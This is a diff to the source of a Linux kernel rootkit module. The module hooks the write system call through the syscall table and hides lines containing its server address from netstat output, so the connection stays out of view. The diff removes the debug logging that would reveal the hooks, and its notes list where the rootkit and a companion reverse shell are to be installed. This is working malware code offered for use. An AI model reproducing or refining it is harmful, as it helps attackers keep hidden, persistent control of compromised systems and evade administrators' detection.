@@ -164,16 +164,15 @@ asmlinkage ssize_t write_hook(int fd, const void *buf, size_t count){
         }
     }
 
+//                                              - netstat -  
+
     if(strstr(current->comm, "netstat")){
         temp_cc = (char *) kmalloc(count, GFP_KERNEL);
-
-        printk(KERN_INFO "NETSTAT CALLED!!!!");
 
         copy_from_user(temp_cc, buf, count); //copy vars from user space
 
         if(strstr(temp_cc, svr_addr) != NULL){ //check for module in buf
 
-            printk(KERN_INFO "FOUND SVR ADDR");
             //free mmemory (limited heavily in kernel land)
             kfree(temp_cc);
             
@@ -198,10 +197,6 @@ static int __init SetHooks(void) {
     
     // instalize system call table variable, using call system to get the memory location
  	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 
-    
-    //DEBUGGING !REMOVE AFTER SUCCESSFUL DRYRUN!
-	//printk(KERN_INFO "Hooks Will Be Set.\n");
-	//printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 
     // Opens the memory pages to be written
 	enablePageWriting((unsigned long )SYS_CALL_TABLE);
@@ -234,9 +229,6 @@ static void __exit CleanupHooks(void) {
 	SYS_CALL_TABLE[__NR_write] = (unsigned long*)original_write;
 
     disablePageWriting((unsigned long )SYS_CALL_TABLE);
-    
-    //DEBUGGING !REMOVE AFTER SUCCESSFUL DRYRUN!
-	//printk(KERN_INFO "Hooks cleaned up");
 }
 
 // ==================================================================================================================================
@@ -254,11 +246,10 @@ module_exit(CleanupHooks);
 
 /*
                                                                 - Documentation -
-
+                                                                
         ~> Detailed documentation of the code here can be found in fragmatised form in the code_lib sub folders
 
-
-        ~> Rootkit will be deployed to /usr/games/
-        ~> Reverse shell will be deployed to /TODO
+        ~> Rootkit will be deployed to /home/usr/Templates
+        ~> Reverse shell will be deployed to /usr/games
 
 */
